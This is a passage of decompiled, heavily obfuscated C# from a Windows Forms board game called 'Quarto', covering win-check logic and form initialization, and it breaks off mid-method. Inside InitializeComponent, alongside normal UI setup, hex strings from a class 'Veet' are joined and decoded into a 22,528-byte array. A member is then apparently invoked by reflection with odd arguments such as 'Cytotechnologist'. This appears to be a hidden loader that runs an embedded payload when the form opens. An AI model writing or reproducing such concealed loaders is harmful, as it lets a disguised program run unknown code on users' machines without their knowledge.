				{
					int num38;
					if (mem[num4, 0].Dark == mem[num4, 1].Dark)
					{
						num = 737625082;
						num38 = 737625082;
					}
					else
					{
						num = 1411429853;
						num38 = 1411429853;
					}
					continue;
				}
				case 55u:
				{
					int num34;
					int num35;
					if (mem[num4, 1].Square == mem[num4, 2].Square)
					{
						num34 = 684271667;
						num35 = 684271667;
					}
					else
					{
						num34 = 141462902;
						num35 = 141462902;
					}
					num = num34 ^ (int)(num2 * 1725694463);
					continue;
				}
				case 54u:
				{
					int num25;
					int num26;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num25 = 1286965533;
						num26 = 1286965533;
					}
					else
					{
						num25 = 199947351;
						num26 = 199947351;
					}
					num = num25 ^ ((int)num2 * -945696863);
					continue;
				}
				case 53u:
					if (mem[3, num4] != null)
					{
						num = (int)(num2 * 1571185044) ^ -1316533572;
						continue;
					}
					goto IL_00f9;
				case 52u:
					if (mem[2, num4].Dark != mem[3, num4].Dark)
					{
						num = (int)(num2 * 454031923) ^ -402096762;
						continue;
					}
					goto IL_0105;
				case 51u:
					num = 33987213;
					continue;
				case 50u:
				{
					int num70;
					int num71;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num70 = 427871812;
						num71 = 427871812;
					}
					else
					{
						num70 = 458255899;
						num71 = 458255899;
					}
					num = num70 ^ ((int)num2 * -481793527);
					continue;
				}
				case 49u:
				{
					int num68;
					int num69;
					if (flag2)
					{
						num68 = 1836745354;
						num69 = 1836745354;
					}
					else
					{
						num68 = 1873020484;
						num69 = 1873020484;
					}
					num = num68 ^ ((int)num2 * -1424663158);
					continue;
				}
				case 48u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -358590396) ^ -1158920898;
						continue;
					}
					goto IL_056a;
				case 47u:
				{
					int num54;
					int num55;
					if (mem[num4, 1] != null)
					{
						num54 = -1712136369;
						num55 = -1712136369;
					}
					else
					{
						num54 = -1609592758;
						num55 = -1609592758;
					}
					num = num54 ^ ((int)num2 * -300548635);
					continue;
				}
				case 46u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1607694612) ^ -1248903780;
						continue;
					}
					goto IL_0167;
				case 45u:
				{
					int num51;
					if (mem[num4, 0].Point != mem[num4, 1].Point)
					{
						num = 1002567139;
						num51 = 1002567139;
					}
					else
					{
						num = 258613398;
						num51 = 258613398;
					}
					continue;
				}
				case 43u:
				{
					int num43;
					int num44;
					if (!flag3)
					{
						num43 = -30860114;
						num44 = -30860114;
					}
					else
					{
						num43 = -1450466556;
						num44 = -1450466556;
					}
					num = num43 ^ (int)(num2 * 1821821627);
					continue;
				}
				case 42u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 98760772;
						continue;
					}
					goto IL_056a;
				case 41u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -608461142) ^ -1923865902;
						continue;
					}
					goto IL_0277;
				case 40u:
				{
					int num36;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 371738210;
						num36 = 371738210;
					}
					else
					{
						num = 513492370;
						num36 = 513492370;
					}
					continue;
				}
				case 39u:
				{
					int num32;
					int num33;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num32 = 1003816238;
						num33 = 1003816238;
					}
					else
					{
						num32 = 96548571;
						num33 = 96548571;
					}
					num = num32 ^ ((int)num2 * -883832443);
					continue;
				}
				case 38u:
				{
					int num27;
					int num28;
					if (mem[3, 3] == null)
					{
						num27 = 1499014461;
						num28 = 1499014461;
					}
					else
					{
						num27 = 1808404677;
						num28 = 1808404677;
					}
					num = num27 ^ (int)(num2 * 1457258211);
					continue;
				}
				case 37u:
					num4 = 0;
					num = (int)(num2 * 1304755079) ^ -597600682;
					continue;
				case 36u:
					if (mem[2, 1] != null)
					{
						num = (int)(num2 * 1989427055) ^ -779701382;
						continue;
					}
					goto IL_031c;
				case 35u:
				{
					int num16;
					int num17;
					if (mem[0, 0] == null)
					{
						num16 = -890898508;
						num17 = -890898508;
					}
					else
					{
						num16 = -1456768128;
						num17 = -1456768128;
					}
					num = num16 ^ ((int)num2 * -1221120703);
					continue;
				}
				case 34u:
				{
					int num12;
					int num13;
					if (mem[num4, 1].Dark == mem[num4, 2].Dark)
					{
						num12 = 538516570;
						num13 = 538516570;
					}
					else
					{
						num12 = 1833781749;
						num13 = 1833781749;
					}
					num = num12 ^ (int)(num2 * 2070530299);
					continue;
				}
				case 33u:
					if (mem[0, num4] != null)
					{
						num = 990062056;
						continue;
					}
					goto IL_00f9;
				case 32u:
					if (mem[num4, 2].Dark != mem[num4, 3].Dark)
					{
						num = ((int)num2 * -1107439849) ^ 0x49EC87CD;
						continue;
					}
					goto IL_0105;
				case 31u:
					num = ((int)num2 * -740817038) ^ -710532339;
					continue;
				case 30u:
					if (mem[1, num4].Square == mem[2, num4].Square)
					{
						num = (int)(num2 * 2135085267) ^ -1961951222;
						continue;
					}
					goto IL_00f9;
				case 29u:
					if (mem[num4, 2].Big != mem[num4, 3].Big)
					{
						num = ((int)num2 * -698287629) ^ -894006111;
						continue;
					}
					goto IL_0105;
				case 28u:
				{
					int num64;
					int num65;
					if (mem[1, num4].Big == mem[2, num4].Big)
					{
						num64 = -150371744;
						num65 = -150371744;
					}
					else
					{
						num64 = -837544433;
						num65 = -837544433;
					}
					num = num64 ^ ((int)num2 * -1195697306);
					continue;
				}
				case 27u:
				{
					int num62;
					int num63;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num62 = -1757938566;
						num63 = -1757938566;
					}
					else
					{
						num62 = -598403206;
						num63 = -598403206;
					}
					num = num62 ^ (int)(num2 * 1907324702);
					continue;
				}
				case 26u:
				{
					int num56;
					int num57;
					if (mem[1, num4].Dark != mem[2, num4].Dark)
					{
						num56 = 1983081872;
						num57 = 1983081872;
					}
					else
					{
						num56 = 962936208;
						num57 = 962936208;
					}
					num = num56 ^ ((int)num2 * -317003534);
					continue;
				}
				case 25u:
					if (mem[0, 3] != null)
					{
						num = 323612097;
						continue;
					}
					goto IL_031c;
				case 24u:
					flag = true;
					num = (int)((num2 * 1279102995) ^ 0x68D485E8);
					continue;
				case 23u:
				{
					int num52;
					if (mem[0, num4].Dark != mem[1, num4].Dark)
					{
						num = 1364697452;
						num52 = 1364697452;
					}
					else
					{
						num = 1862485740;
						num52 = 1862485740;
					}
					continue;
				}
				case 22u:
					result = flag;
					num = 96267489;
					continue;
				case 21u:
				{
					int num47;
					int num48;
					if (mem[1, 1] == null)
					{
						num47 = 225826318;
						num48 = 225826318;
					}
					else
					{
						num47 = 859461958;
						num48 = 859461958;
					}
					num = num47 ^ (int)(num2 * 1580931209);
					continue;
				}
				case 20u:
				{
					int num45;
					int num46;
					if (mem[num4, 1].Point == mem[num4, 2].Point)
					{
						num45 = -890751855;
						num46 = -890751855;
					}
					else
					{
						num45 = -363400805;
						num46 = -363400805;
					}
					num = num45 ^ (int)(num2 * 1997143878);
					continue;
				}
				case 19u:
					if (mem[2, num4] != null)
					{
						num = ((int)num2 * -1458418662) ^ 0x7951427F;
						continue;
					}
					goto IL_00f9;
				case 18u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -82794985) ^ -1474916982;
						continue;
					}
					goto IL_031c;
				case 17u:
				{
					int num39;
					int num40;
					if (mem[1, num4].Point != mem[2, num4].Point)
					{
						num39 = 1506942101;
						num40 = 1506942101;
					}
					else
					{
						num39 = 1709475485;
						num40 = 1709475485;
					}
					num = num39 ^ (int)(num2 * 1149784835);
					continue;
				}
				case 16u:
				{
					int num37;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = 1292783653;
						num37 = 1292783653;
					}
					else
					{
						num = 427419715;
						num37 = 427419715;
					}
					continue;
				}
				case 15u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 1596774358) ^ -455538065;
						continue;
					}
					goto IL_0277;
				case 14u:
					if (mem[2, num4].Big != mem[3, num4].Big)
					{
						num = ((int)num2 * -467364566) ^ 0x180FB343;
						continue;
					}
					goto IL_0105;
				case 13u:
				{
					int num30;
					int num31;
					if (mem[2, 2] == null)
					{
						num30 = -404969487;
						num31 = -404969487;
					}
					else
					{
						num30 = -747055650;
						num31 = -747055650;
					}
					num = num30 ^ (int)(num2 * 299481964);
					continue;
				}
				case 12u:
				{
					int num29;
					if (mem[0, num4].Point != mem[1, num4].Point)
					{
						num = 328913018;
						num29 = 328913018;
					}
					else
					{
						num = 1700859047;
						num29 = 1700859047;
					}
					continue;
				}
				case 11u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -129092816) ^ -187698229;
						continue;
					}
					goto IL_0277;
				case 10u:
					if (mem[0, num4].Square == mem[1, num4].Square)
					{
						num = 575693008;
						continue;
					}
					goto IL_00f9;
				case 9u:
				{
					int num24;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = 543715540;
						num24 = 543715540;
					}
					else
					{
						num = 1913375931;
						num24 = 1913375931;
					}
					continue;
				}
				case 8u:
				{
					int num20;
					int num21;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num20 = -587631273;
						num21 = -587631273;
					}
					else
					{
						num20 = -107828195;
						num21 = -107828195;
					}
					num = num20 ^ (int)(num2 * 150877857);
					continue;
				}
				case 7u:
				{
					int num14;
					int num15;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num14 = 1726388557;
						num15 = 1726388557;
					}
					else
					{
						num14 = 283947416;
						num15 = 283947416;
					}
					num = num14 ^ ((int)num2 * -1784917091);
					continue;
				}
				case 6u:
					if (mem[2, num4].Point != mem[3, num4].Point)
					{
						num = ((int)num2 * -1756306634) ^ 0x198A03DA;
						continue;
					}
					goto IL_0105;
				case 5u:
				{
					int num11;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 1163445774;
						num11 = 1163445774;
					}
					else
					{
						num = 1613506596;
						num11 = 1613506596;
					}
					continue;
				}
				case 4u:
					num10 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0168;
				case 3u:
					num = ((int)num2 * -182738275) ^ -1791273888;
					continue;
				case 2u:
					if (mem[num4, 2].Square != mem[num4, 3].Square)
					{
						num = ((int)num2 * -1095858665) ^ 0x16458C7;
						continue;
					}
					goto IL_0105;
				case 1u:
				{
					int num5;
					if (mem[num4, 0].Square == mem[num4, 1].Square)
					{
						num = 1685892493;
						num5 = 1685892493;
					}
					else
					{
						num = 1010971911;
						num5 = 1010971911;
					}
					continue;
				}
				case 0u:
				{
					int num3;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = 529116280;
						num3 = 529116280;
					}
					else
					{
						num = 1286991877;
						num3 = 1286991877;
					}
					continue;
				}
				case 44u:
					break;
				default:
					{
						return result;
					}
					IL_0167:
					num10 = 1;
					goto IL_0168;
					IL_0168:
					flag2 = (byte)num10 != 0;
					num = 41962301;
					continue;
					IL_0277:
					num10 = 1;
					goto IL_0168;
					IL_0105:
					num = 898041673;
					num53 = 898041673;
					continue;
					IL_00f9:
					num = 565556181;
					num53 = 565556181;
					continue;
					IL_056a:
					num10 = 0;
					goto IL_0168;
					IL_031c:
					num10 = 0;
					goto IL_0168;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num6 = default(int);
		int num3 = default(int);
		bool flag3 = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1302653421;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x939EB00Eu) % 16u)
				{
				case 15u:
					num6 = 0;
					num = -666982465;
					continue;
				case 13u:
					num3 = 0;
					num = ((int)num2 * -1649796249) ^ 0x7AE8A3D0;
					continue;
				case 12u:
					flag = false;
					num = ((int)num2 * -1951798434) ^ -2059306798;
					continue;
				case 11u:
				{
					int num7;
					if (mem[num3, num6] != null)
					{
						num = -2045627206;
						num7 = -2045627206;
					}
					else
					{
						num = -1606365694;
						num7 = -1606365694;
					}
					continue;
				}
				case 9u:
					flag3 = num6 < 4;
					num = -1261788295;
					continue;
				case 8u:
					result = flag;
					num = ((int)num2 * -310698146) ^ -2051696100;
					continue;
				case 7u:
				{
					int num8;
					int num9;
					if (!flag3)
					{
						num8 = -411586603;
						num9 = -411586603;
					}
					else
					{
						num8 = -1669075538;
						num9 = -1669075538;
					}
					num = num8 ^ ((int)num2 * -647381939);
					continue;
				}
				case 6u:
					flag2 = num3 < 4;
					num = -2140628611;
					continue;
				case 5u:
					num = (int)(num2 * 1481963791) ^ -963650957;
					continue;
				case 4u:
					num6++;
					num = -982353929;
					continue;
				case 3u:
				{
					int num4;
					int num5;
					if (!flag2)
					{
						num4 = -548551394;
						num5 = -548551394;
					}
					else
					{
						num4 = -269859879;
						num5 = -269859879;
					}
					num = num4 ^ ((int)num2 * -414998440);
					continue;
				}
				case 2u:
					num = (int)((num2 * 1817964008) ^ 0xBDA7A4);
					continue;
				case 1u:
					num = (int)((num2 * 2029314848) ^ 0x30CA9ED7);
					continue;
				case 0u:
					num3++;
					num = ((int)num2 * -2062430987) ^ -1870662920;
					continue;
				case 14u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = 1353122875;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1860CD32u) % 10u)
				{
				case 9u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)((num2 * 1407317343) ^ 0x32C7F74E);
					continue;
				case 8u:
					num = (int)(num2 * 31880484) ^ -296245879;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -781563789) ^ -1514657449;
					continue;
				case 6u:
					num = ((int)num2 * -885024392) ^ -472641530;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)((num2 * 365354102) ^ 0x5BA65D1B);
					continue;
				case 4u:
					num = ((int)num2 * -3589974) ^ 0x7CBCCF09;
					continue;
				case 2u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)((num2 * 1958029648) ^ 0x5BB11F8C);
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 1623139524) ^ 0x580BDB7A);
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -1405770663;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0x880896E0u) % 8u)
				{
				case 7u:
					num = (int)((num2 * 586504389) ^ 0x6E11445E);
					continue;
				case 6u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 1086717768;
						num5 = 1086717768;
					}
					else
					{
						num4 = 1489377411;
						num5 = 1489377411;
					}
					num = num4 ^ ((int)num2 * -2027478458);
					continue;
				}
				case 5u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -846206673) ^ -1528213729;
					continue;
				case 4u:
					((Form)this).Dispose(disposing);
					num = -1806821992;
					continue;
				case 3u:
					num3 = ((components != null) ? 1 : 0);
					goto IL_006a;
				case 1u:
					if (disposing)
					{
						num = ((int)num2 * -428534281) ^ -217269828;
						continue;
					}
					num3 = 0;
					goto IL_006a;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
					IL_006a:
					flag = (byte)num3 != 0;
					num = -1792298482;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0241: Unknown result type (might be due to invalid IL or missing references)
		//IL_024b: Expected O, but got Unknown
		int num3 = default(int);
		byte[] array = default(byte[]);
		string string_ = default(string);
		object[] object_ = default(object[]);
		while (true)
		{
			int num = 1597424967;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x46423271u) % 129u)
				{
				case 128u:
					num = ((int)num2 * -676894377) ^ -1578049321;
					continue;
				case 127u:
					num3++;
					num = (int)(num2 * 399171721) ^ -621602842;
					continue;
				case 126u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -183351303) ^ -1180132308;
					continue;
				case 125u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)((num2 * 1790954213) ^ 0x7A0043C);
					continue;
				case 124u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -711729756) ^ -2025979952;
					continue;
				case 123u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -1487569345) ^ -1141704230;
					continue;
				case 122u:
					Form1.smethod_64((Control)(object)label1, 8);
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)((num2 * 20045403) ^ 0xF90FD24);
					continue;
				case 121u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -813980742) ^ 0x38DC453F;
					continue;
				case 120u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 1915219528) ^ -1933770268;
					continue;
				case 119u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -1697484794) ^ -1852497135;
					continue;
				case 118u:
					label5 = Form1.smethod_57();
					num = ((int)num2 * -1612007959) ^ -802726798;
					continue;
				case 117u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -821513917) ^ 0x555982A1;
					continue;
				case 116u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 1333371379) ^ 0x5753F5AF);
					continue;
				case 115u:
					Form1.smethod_64((Control)(object)button2, 4);
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 595365637) ^ 0x2DC02127);
					continue;
				case 114u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -2048066764) ^ -1160509829;
					continue;
				case 113u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1417156864) ^ -1208257231;
					continue;
				case 112u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -152792722) ^ 0x1DECED27;
					continue;
				case 111u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -1362741288) ^ 0x344AD42A;
					continue;
				case 110u:
					num = (int)((num2 * 1180787143) ^ 0x14CB7558);
					continue;
				case 109u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)(num2 * 1393360251) ^ -395085862;
					continue;
				case 108u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -271153060) ^ 0x42A606AF;
					continue;
				case 107u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -706723969) ^ 0x77F8FC65;
					continue;
				case 106u:
				{
					int num4;
					if (num3 < 22528)
					{
						num = 1674536981;
						num4 = 1674536981;
					}
					else
					{
						num = 1023340176;
						num4 = 1023340176;
					}
					continue;
				}
				case 105u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)(num2 * 1816352708) ^ -1241283678;
					continue;
				case 104u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)((num2 * 1095641390) ^ 0x60E39535);
					continue;
				case 103u:
					button2 = Form1.smethod_53();
					num = ((int)num2 * -881640647) ^ -682410524;
					continue;
				case 102u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -79110883) ^ -594677349;
					continue;
				case 101u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 823425822) ^ 0xBDB2DC);
					continue;
				case 100u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -1827670338) ^ 0x3B7E9EAC;
					continue;
				case 99u:
					string_ = Veet.Sa;
					num = (int)(num2 * 893785917) ^ -1126221919;
					continue;
				case 98u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -2043194070) ^ 0x19DC2A37;
					continue;
				case 97u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -1221225557) ^ -1350291515;
					continue;
				case 96u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 1417509269) ^ 0x615C239E);
					continue;
				case 95u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -1046895240) ^ -97990682;
					continue;
				case 94u:
					pictureBox1 = Form1.smethod_2();
					num = (int)(num2 * 2058060429) ^ -751009518;
					continue;
				case 93u:
					num = ((int)num2 * -741880150) ^ 0x1B12DFF2;
					continue;
				case 92u:
					num = (int)(num2 * 277680196) ^ -1471318757;
					continue;
				case 91u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)((num2 * 2104755497) ^ 0x6E1B7FA3);
					continue;
				case 90u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)((num2 * 996849692) ^ 0x37D01153);
					continue;
				case 89u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -18076090) ^ 0x48FD9CE7;
					continue;
				case 88u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -944545052) ^ -1126784110;
					continue;
				case 87u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -352937924) ^ -1900258827;
					continue;
				case 86u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num3 = 0;
					num = (int)(num2 * 1269521160) ^ -1766014291;
					continue;
				case 85u:
					num = ((int)num2 * -2113391004) ^ 0x5B5CFFDA;
					continue;
				case 84u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 2142010643) ^ 0x66402728);
					continue;
				case 83u:
					num = ((int)num2 * -1281394392) ^ 0x1BF4D199;
					continue;
				case 82u:
					components = Form1.smethod_52();
					num = (int)((num2 * 1307512248) ^ 0x4445B4B3);
					continue;
				case 81u:
					num = ((int)num2 * -1907775211) ^ 0x3BFD26C5;
					continue;
				case 80u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -110652086) ^ -1103134036;
					continue;
				case 79u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -960229855) ^ 0x3E8A3E91;
					continue;
				case 78u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)(num2 * 91340292) ^ -615983995;
					continue;
				case 77u:
					CharArray(array, string.Empty);
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -1054632356) ^ -779331362;
					continue;
				case 76u:
					Form1.smethod_92((Control)(object)this);
					num = (int)((num2 * 953918769) ^ 0x4682F2FC);
					continue;
				case 75u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)(num2 * 1229548099) ^ -1970312164;
					continue;
				case 74u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 342951836) ^ -265504624;
					continue;
				case 73u:
					num = ((int)num2 * -498088019) ^ -2121317475;
					continue;
				case 72u:
					num = (int)(num2 * 957258234) ^ -984139288;
					continue;
				case 71u:
					Form1.smethod_70(ComMember, object_);
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -1474754666) ^ 0x44BCE502;
					continue;
				case 70u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -17058299) ^ 0x580893BC;
					continue;
				case 69u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1359160323) ^ 0x75410B70;
					continue;
				case 68u:
					num = ((int)num2 * -1849033335) ^ 0x3670C245;
					continue;
				case 67u:
					num = ((int)num2 * -708904151) ^ 0x49BEFD77;
					continue;
				case 66u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1221045220) ^ -1459274557;
					continue;
				case 65u:
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					num = ((int)num2 * -2045737793) ^ 0x44D6424D;
					continue;
				case 64u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -1419184799) ^ 0x43597EA2;
					continue;
				case 62u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -1477625388) ^ -433497522;
					continue;
				case 61u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -680776040) ^ -71218122;
					continue;
				case 60u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -8570670) ^ 0xCDF0082;
					continue;
				case 59u:
					num = 1557511928;
					continue;
				case 58u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = ((int)num2 * -1862606541) ^ -885291145;
					continue;
				case 57u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)(num2 * 1844198267) ^ -1183493243;
					continue;
				case 56u:
					label2 = Form1.smethod_57();
					num = ((int)num2 * -54576206) ^ 0x5227C73A;
					continue;
				case 55u:
					num = ((int)num2 * -2028018392) ^ 0x6468190;
					continue;
				case 54u:
					num = ((int)num2 * -298245476) ^ -1337660969;
					continue;
				case 53u:
					num = (int)((num2 * 723713076) ^ 0x4B71874A);
					continue;
				case 52u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -896011200) ^ -642130073;
					continue;
				case 51u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -1839451163) ^ -853979196;
					continue;
				case 50u:
					num = ((int)num2 * -269638726) ^ 0x5B49E2A1;
					continue;
				case 49u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -2032365433) ^ 0x1BB15B71;
					continue;
				case 48u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1617887755) ^ 0x264C32FC;
					continue;
				case 47u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -480306502) ^ -1905558618;
					continue;
				case 46u:
					num = ((int)num2 * -701954322) ^ -1916254184;
					continue;
				case 45u:
					num = ((int)num2 * -2068206359) ^ -1801906978;
					continue;
				case 44u:
					num = (int)(num2 * 177807138) ^ -1033686550;
					continue;
				case 43u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -742986054) ^ 0x279E712F;
					continue;
				case 42u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)(num2 * 876906961) ^ -208062577;
					continue;
				case 41u:
					num = ((int)num2 * -869872008) ^ 0x13D61A55;
					continue;
				case 40u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)(num2 * 1116678692) ^ -437337042;
					continue;
				case 39u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -1054807940) ^ -1148139700;
					continue;
				case 38u:
					num = (int)(num2 * 1021470761) ^ -1908119951;
					continue;
				case 37u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)((num2 * 1582620545) ^ 0x27ED80E7);
					continue;
				case 36u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 16953) ^ -741018890;
					continue;
				case 35u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)((num2 * 851980344) ^ 0x367AF40D);
					continue;
				case 33u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -1137774488) ^ -1147931561;
					continue;
				case 32u:
					num = ((int)num2 * -423596810) ^ -274927664;
					continue;
				case 31u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 802098074) ^ 0x3D123CB4);
					continue;
				case 30u:
					num = (int)(num2 * 1236832068) ^ -413074523;
					continue;
				case 29u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -1475282244) ^ -1514322990;
					continue;
				case 28u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -46770298) ^ 0x654B542C;
					continue;
				case 27u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -846647329) ^ -1740626356;
					continue;
				case 26u:
					Form1.smethod_72(timer1, 1000);
					num = (int)((num2 * 522163745) ^ 0x6274B61A);
					continue;
				case 25u:
